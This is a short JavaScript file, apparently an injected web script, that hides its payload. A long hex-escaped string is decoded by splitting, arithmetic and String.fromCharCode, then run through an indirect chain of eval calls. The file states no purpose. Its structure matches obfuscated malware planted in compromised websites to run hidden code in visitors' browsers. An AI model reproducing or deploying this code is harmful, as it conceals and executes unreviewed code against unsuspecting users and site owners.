var _0xfcae=["\x39\x35\x30\x44\x34\x32\x44\x31\x33\x36\x45\x33\x36\x38\x45\x33\x32\x36\x45\x33\x36\x30\x43\x31\x39\x36\x42\x33\x36\x36\x44\x33\x36\x32\x44\x33\x33\x34\x45\x33\x36\x30\x43\x33\x32\x32\x41\x33\x34\x32\x44\x33\x33\x32\x42\x32\x35\x34\x43\x33\x33\x32\x46\x33\x35\x34\x44\x33\x33\x30\x41\x33\x36\x36\x42\x33\x35\x30\x43\x33\x33\x34\x45\x33\x35\x32\x43\x33\x36\x34\x44\x32\x32\x34\x46\x33\x33\x30\x45\x33\x35\x34\x46\x33\x35\x34\x42\x33\x34\x36\x43\x33\x34\x32\x45\x33\x33\x34\x45\x32\x32\x34\x45\x33\x35\x30\x45\x33\x32\x36\x43\x33\x36\x34\x44\x33\x33\x30\x41\x33\x34\x30\x42\x32\x31\x32\x41\x33\x33\x32\x43\x33\x35\x34\x45\x33\x33\x30\x43\x33\x36\x36\x43\x33\x35\x30\x44\x33\x33\x34\x45\x33\x35\x32\x45\x33\x36\x34\x44\x32\x32\x34\x42\x33\x33\x30\x46\x33\x35\x34\x41\x33\x35\x34\x46\x33\x34\x36\x44\x33\x34\x32\x45\x33\x33\x34\x45\x32\x32\x34\x42\x33\x35\x30\x45\x33\x32\x36\x44\x33\x36\x34\x45\x33\x33\x30\x46\x33\x34\x30\x44\x32\x31\x32\x43\x32\x32\x36\x45\x33\x33\x30\x44\x33\x32\x32\x42\x33\x36\x36\x46\x33\x36\x32\x45\x33\x33\x34\x44\x33\x36\x30\x41\x32\x35\x34\x45\x32\x31\x32\x46\x33\x31\x36\x43\x33\x33\x32\x41\x32\x31\x38\x42\x32\x31\x34\x42\x32\x32\x36\x45\x32\x31\x34\x42\x33\x31\x34\x42\x32\x33\x30\x46\x33\x31\x38\x46\x32\x31\x34\x44\x32\x35\x30\x41\x33\x33\x36\x46\x33\x36\x36\x43\x33\x35\x32\x44\x33\x33\x30\x44\x33\x36\x34\x45\x33\x34\x32\x42\x33\x35\x34\x46\x33\x35\x32\x42\x31\x39\x36\x41\x33\x36\x34\x44\x33\x32\x36\x41\x33\x35\x32\x44\x33\x36\x34\x45\x33\x37\x34\x41\x33\x36\x34\x45\x33\x35\x34\x41\x33\x35\x32\x41\x32\x31\x32\x44\x33\x34\x32\x42\x33\x33\x32\x41\x32\x31\x34\x43\x33\x37\x38\x45\x33\x36\x38\x42\x33\x32\x36\x45\x33\x36\x30\x44\x31\x39\x36\x41\x33\x30\x38\x45\x32\x35\x34\x42\x33\x35\x32\x46\x33\x33\x34\x46\x33\x37\x30\x45\x31\x39\x36\x45\x33\x30\x38\x42\x32\x38\x36\x44\x32\x38\x34\x43\x32\x37\x36\x45\x33\x36\x34\x46\x33\x36\x34\x41\x33\x35\x36\x41\x32\x39\x36\x45\x33\x33\x34\x41\x33\x35\x38\x46\x33\x36\x36\x41\x33\x33\x34\x41\x33\x36\x32\x44\x33\x36\x34\x41\x32\x31\x32\x44\x32\x31\x34\x43\x32\x35\x30\x42\x33\x36\x38\x45\x33\x32\x36\x43\x33\x36\x30\x43\x31\x39\x36\x44\x33\x30\x38\x45\x33\x30\x32\x46\x32\x39\x36\x41\x32\x38\x34\x41\x32\x35\x34\x41\x32\x31\x30\x45\x32\x32\x36\x45\x32\x32\x36\x43\x33\x37\x30\x46\x33\x37\x30\x41\x33\x37\x30\x43\x32\x32\x34\x41\x33\x33\x36\x45\x33\x32\x36\x45\x33\x33\x30\x42\x33\x33\x34\x42\x33\x32\x38\x43\x33\x35\x34\x42\x33\x35\x34\x45\x33\x34\x36\x46\x32\x32\x34\x42\x33\x33\x30\x42\x33\x35\x34\x41\x33\x35\x30\x41\x32\x32\x36\x44\x33\x34\x30\x46\x33\x33\x34\x41\x33\x34\x38\x44\x33\x35\x36\x44\x32\x32\x36\x46\x33\x33\x30\x41\x33\x35\x34\x42\x33\x35\x30\x44\x33\x35\x30\x46\x33\x36\x36\x42\x33\x35\x32\x46\x33\x34\x32\x46\x33\x36\x34\x41\x33\x37\x34\x45\x32\x32\x36\x44\x33\x32\x36\x41\x33\x33\x30\x43\x33\x36\x34\x45\x33\x34\x32\x42\x33\x35\x34\x42\x33\x35\x32\x44\x33\x36\x32\x43\x32\x32\x36\x46\x32\x33\x30\x42\x32\x33\x36\x44\x32\x34\x30\x41\x32\x33\x36\x41\x32\x34\x34\x41\x32\x34\x36\x46\x32\x33\x36\x44\x32\x33\x32\x43\x32\x33\x32\x44\x32\x32\x38\x45\x32\x33\x36\x45\x32\x32\x38\x41\x32\x33\x36\x44\x32\x34\x34\x42\x32\x34\x36\x44\x32\x33\x34\x46\x32\x31\x30\x42\x32\x35\x30\x42\x33\x36\x38\x41\x33\x32\x36\x42\x33\x36\x30\x46\x31\x39\x36\x44\x33\x30\x38\x45\x32\x39\x32\x42\x33\x32\x36\x46\x33\x36\x30\x43\x33\x32\x36\x42\x33\x35\x30\x42\x33\x36\x32\x46\x32\x35\x34\x46\x32\x31\x30\x45\x33\x32\x36\x42\x33\x33\x30\x45\x33\x36\x34\x45\x33\x34\x32\x44\x33\x35\x34\x41\x33\x35\x32\x44\x32\x35\x34\x45\x33\x34\x30\x41\x33\x33\x34\x42\x33\x34\x38\x46\x33\x35\x36\x41\x33\x33\x36\x42\x33\x36\x36\x41\x33\x34\x38\x41\x32\x30\x38\x46\x33\x32\x32\x44\x33\x32\x32\x42\x33\x36\x36\x46\x33\x36\x32\x41\x33\x33\x34\x44\x33\x36\x30\x45\x32\x35\x34\x44\x32\x31\x30\x42\x32\x31\x38\x44\x33\x36\x36\x44\x33\x36\x32\x45\x33\x33\x34\x44\x33\x36\x30\x44\x33\x32\x32\x46\x33\x34\x32\x45\x33\x33\x32\x44\x32\x31\x38\x42\x32\x31\x30\x45\x32\x30\x38\x46\x33\x32\x32\x43\x33\x32\x32\x43\x33\x32\x36\x43\x32\x35\x34\x43\x32\x33\x30\x42\x32\x30\x38\x46\x33\x32\x32\x46\x33\x32\x32\x42\x33\x33\x32\x46\x33\x37\x34\x41\x33\x35\x32\x42\x32\x35\x34\x45\x32\x34\x32\x46\x33\x37\x30\x46\x33\x34\x38\x44\x32\x37\x30\x45\x33\x32\x36\x45\x32\x37\x32\x44\x32\x34\x34\x45\x32\x33\x38\x45\x32\x34\x30\x45\x32\x33\x32\x42\x32\x34\x30\x45\x33\x32\x38\x41\x33\x37\x32\x46\x32\x34\x30\x41\x33\x35\x30\x43\x32\x33\x38\x44\x32\x37\x30\x44\x32\x30\x38\x45\x33\x32\x32\x45\x33\x32\x32\x44\x33\x36\x30\x45\x33\x33\x34\x42\x33\x35\x38\x45\x32\x35\x34\x46\x32\x33\x36\x44\x32\x30\x38\x41\x33\x33\x36\x43\x33\x32\x38\x44\x33\x32\x32\x46\x33\x33\x32\x44\x33\x36\x34\x41\x33\x36\x32\x42\x33\x33\x38\x45\x32\x35\x34\x45\x32\x31\x30\x41\x32\x31\x38\x42\x33\x33\x36\x45\x33\x32\x38\x46\x33\x32\x32\x43\x33\x33\x32\x43\x33\x36\x34\x42\x33\x36\x32\x46\x33\x33\x38\x43\x32\x31\x38\x45\x32\x31\x30\x42\x32\x30\x38\x46\x33\x36\x34\x42\x33\x36\x34\x42\x33\x36\x32\x43\x33\x36\x34\x46\x33\x32\x36\x41\x33\x35\x30\x42\x33\x35\x36\x41\x32\x35\x34\x45\x32\x33\x32\x45\x32\x34\x30\x42\x32\x33\x38\x45\x32\x34\x34\x44\x32\x33\x30\x42\x32\x34\x30\x44\x32\x34\x34\x44\x32\x34\x36\x46\x32\x32\x38\x45\x32\x34\x34\x43\x32\x34\x32\x44\x32\x33\x30\x42\x32\x33\x30\x43\x32\x34\x36\x43\x32\x33\x30\x45\x32\x32\x38\x45\x32\x34\x32\x43\x32\x33\x30\x45\x32\x33\x30\x41\x32\x34\x36\x41\x32\x31\x30\x46\x32\x35\x30\x46\x33\x30\x38\x46\x32\x32\x34\x41\x33\x35\x34\x44\x33\x35\x36\x43\x33\x33\x34\x41\x33\x35\x32\x44\x32\x31\x32\x41\x32\x30\x30\x45\x32\x39\x32\x46\x32\x39\x30\x41\x32\x39\x38\x43\x33\x30\x30\x41\x32\x30\x30\x46\x32\x32\x30\x41\x33\x30\x38\x41\x33\x30\x32\x42\x32\x39\x36\x46\x32\x38\x34\x42\x32\x32\x30\x41\x33\x36\x34\x42\x33\x36\x30\x42\x33\x36\x36\x46\x33\x33\x34\x41\x32\x31\x34\x42\x32\x35\x30\x42\x33\x30\x38\x42\x32\x32\x34\x43\x33\x35\x34\x45\x33\x35\x32\x44\x33\x36\x30\x44\x33\x33\x34\x44\x33\x32\x36\x42\x33\x33\x32\x45\x33\x37\x34\x43\x33\x36\x32\x41\x33\x36\x34\x44\x33\x32\x36\x41\x33\x36\x34\x45\x33\x33\x34\x41\x33\x33\x30\x43\x33\x34\x30\x46\x33\x32\x36\x46\x33\x35\x32\x42\x33\x33\x38\x41\x33\x33\x34\x44\x32\x35\x34\x45\x33\x33\x36\x43\x33\x36\x36\x44\x33\x35\x32\x43\x33\x33\x30\x46\x33\x36\x34\x45\x33\x34\x32\x41\x33\x35\x34\x44\x33\x35\x32\x42\x32\x31\x32\x41\x32\x31\x34\x41\x33\x37\x38\x43\x33\x34\x32\x43\x33\x33\x36\x45\x32\x31\x32\x41\x33\x30\x38\x42\x32\x32\x34\x44\x33\x36\x30\x42\x33\x33\x34\x44\x33\x32\x36\x46\x33\x33\x32\x43\x33\x37\x34\x43\x32\x39\x38\x41\x33\x36\x34\x42\x33\x32\x36\x44\x33\x36\x34\x45\x33\x33\x34\x46\x32\x35\x34\x44\x32\x35\x34\x43\x32\x33\x36\x46\x32\x30\x38\x44\x32\x30\x38\x44\x33\x30\x38\x46\x32\x32\x34\x42\x33\x36\x32\x41\x33\x36\x34\x42\x33\x32\x36\x43\x33\x36\x34\x43\x33\x36\x36\x45\x33\x36\x32\x41\x32\x35\x34\x42\x32\x35\x34\x43\x32\x33\x32\x45\x32\x32\x38\x44\x32\x32\x38\x46\x32\x31\x34\x43\x33\x37\x38\x41\x33\x30\x38\x44\x32\x32\x34\x43\x33\x33\x30\x45\x33\x34\x38\x46\x33\x35\x34\x44\x33\x36\x32\x43\x33\x33\x34\x42\x33\x38\x32\x44\x33\x38\x32\x46\x32\x35\x30\x42\x33\x30\x38\x45\x32\x32\x34\x43\x33\x36\x32\x44\x33\x33\x34\x44\x33\x35\x32\x42\x33\x33\x32\x42\x32\x31\x32\x43\x33\x30\x38\x44\x32\x39\x32\x41\x33\x32\x36\x41\x33\x36\x30\x43\x33\x32\x36\x43\x33\x35\x30\x43\x33\x36\x32\x43\x32\x31\x34\x45\x33\x38\x32\x42\x33\x33\x32\x46\x33\x36\x38\x45\x33\x33\x30\x46\x33\x36\x32\x44\x32\x31\x32\x46\x32\x31\x30\x46\x32\x33\x30\x42\x32\x32\x38\x44\x32\x32\x38\x42\x32\x32\x38\x45\x32\x32\x38\x41\x32\x33\x36\x43\x32\x32\x38\x44\x32\x33\x32\x46\x32\x34\x30\x43\x32\x34\x32\x42\x32\x34\x36\x45\x32\x34\x34\x41\x32\x33\x38\x42\x32\x33\x34\x41\x32\x33\x38\x43\x32\x31\x30\x45\x32\x31\x34\x42\x32\x35\x30\x44","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x41\x74","\x73\x70\x6C\x69\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","","\x5F\x31\x39\x35\x36","\x5F\x33\x34\x30\x31\x3D\x5F\x31\x34\x30\x35","\x5F\x36\x33\x36\x34\x3D\x5F\x38\x35\x36\x39","\x5F\x32\x36\x37\x30\x3D\x5F\x36\x33\x36\x34"];var _5496;var _2576=_0xfcae[0];var _6680=/[\x41\x42\x43\x44\x45\x46]/;var _1437=2;var _5484=_2576[_0xfcae[2]](_2576[_0xfcae[1]]-1);var _1405;var _4445=_2576[_0xfcae[3]](_6680);var _5804=[String[_0xfcae[4]],isNaN,parseInt,String];_4445[1]=_5804[_1437+1](_5804[_1437](_4445[1])/21);var _8569=(_1437==9)?String:eval;_1405=_0xfcae[5];_11=_5804[_1437](_4445[0])/_5804[_1437](_4445[1]);for(_5496=3;_5496<_11;_5496++){_1405+=(_5804[_1437-2]((_5804[_1437](_4445[_5496])+_5804[_1437](_4445[2])+_5804[_1437](_4445[1]))/_5804[_1437](_4445[1])-_5804[_1437](_4445[2])+_5804[_1437](_4445[1])-1));} ;var _3401=_0xfcae[6];var _3408=_0xfcae[7];function _6364(_0x250bxd){_8569(_4842);_6364(_2670);_2670(_3408);_6364(_3401);} ;var _4842=_0xfcae[8];var _2670=_0xfcae[9];_6364(_5484);